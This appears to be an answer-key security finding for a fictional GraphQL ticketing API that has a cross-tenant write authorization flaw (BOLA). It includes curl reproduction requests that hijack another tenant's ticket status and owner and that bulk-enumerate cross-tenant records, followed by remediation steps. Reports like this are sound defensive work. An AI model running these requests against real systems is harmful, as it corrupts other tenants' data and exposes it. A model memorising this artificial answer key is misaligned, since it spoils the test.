# Expected Response

## System
- Domain: Event Management / Ticketing
- System: VenueCore Ticketing API
- Example ID: GQL-0049

## Priority Findings

### Finding 1: Write-Level BOLA + ownerId Injection via updateResource — Cross-Tenant Ticketing Record Corruption (Pattern 1.6)
**Severity:** Critical
**Category:** BOLA / Write Without Ownership Check

**Summary:**
The `updateResource` mutation on `POST /graphql` accepts an arbitrary `resourceId` without verifying ownership. Per §5.0: "A write-level BOLA allows state corruption across tenants." An attacker from `tenant-b4cf` targeted ticketing record `R-2049` (belonging to `tenant-f044`), injecting `status: "approved"` and `ownerId: "attacker-b4cff044"`. The response `200 OK` with `tenant-f044` data confirms the cross-tenant write succeeded. In event ticketing, corrupting ticket status (`approved`) across tenants can fraudulently validate tickets or disrupt event access control.

**Evidence from HAR:**
- Request: `POST https://api.venuecore-ticketing-.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-b4cf` — attacker's identity
- Mutation payload: `updateResource(id: "R-2049", input: {status: "approved", ownerId: "attacker-b4cff044"})` — cross-tenant write
- Response HTTP status: `200 OK` — write succeeded
- Response `tenantId`: `tenant-f044`
- Response `ownerId`: `other-user-b4cff044`
- Response `sensitiveField`: `CONFIDENTIAL-b4cff044`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-b4cff044`

**Root Cause (§4.0 RISK-GQL-049 + §5.0):** "`updateResource` accepts an arbitrary `resourceId` without verifying the requester owns that object."

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-049 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.6 | "`updateResource` accepts arbitrary resourceId without ownership check — write-level BOLA" |
| HAR entry | request.postData | `updateResource(id: "R-2049", input: {status: "approved", ownerId: "attacker-b4cff044"})` |
| HAR entry | response.content | `tenantId: "tenant-f044"`, `200 OK` |

---

## Steps to Reproduce

### Step 1 — Baseline (own ticket record)
```bash
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b4cf" \
  -d '{"query": "mutation { updateResource(id: \"R-b4cf-001\", input: {status: \"pending\"}) { resourceId status tenantId } }"}'
```
**Expected:** Updates own ticket; `tenantId: "tenant-b4cf"`.

### Step 2 — Write-level BOLA (HAR attack)
```bash
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b4cf" \
  -d '{"query": "mutation { updateResource(id: \"R-2049\", input: {status: \"approved\", ownerId: \"attacker-b4cff044\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `R-2049` (tenant-f044) updated to `approved`, ownerId hijacked.
**Secure outcome:** HTTP 403 or FORBIDDEN.

### Step 3 — Bulk cross-tenant ticket enumeration
```bash
curl -s -X POST https://api.venuecore-ticketing-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b4cf" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2049\", \"R-f044-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns ticket records from `tenant-f044`.

## Remediation
1. **Resolver tenant guard on updateResource:** `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. **Strip ownerId from ResourceInput.**
3. **Per-ID ownership filter in bulkResourceLookup.**
4. **Redis cache key includes tenantId.**
